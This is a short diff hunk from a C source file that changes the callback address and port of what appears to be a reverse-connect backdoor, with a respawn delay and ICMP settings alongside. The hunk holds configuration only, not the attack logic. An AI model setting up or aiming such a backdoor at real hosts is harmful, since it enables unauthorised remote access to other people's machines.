@@ -38,8 +38,8 @@
 #include <signal.h>
 
 #ifdef STATIC
-# define REVERSE_HOST     "10.0.0.1"
-# define REVERSE_PORT     19832
+# define REVERSE_HOST     "192.168.56.101"
+# define REVERSE_PORT     5555
 # define RESPAWN_DELAY    15
 #else
 # define ICMP_PACKET_SIZE 1024
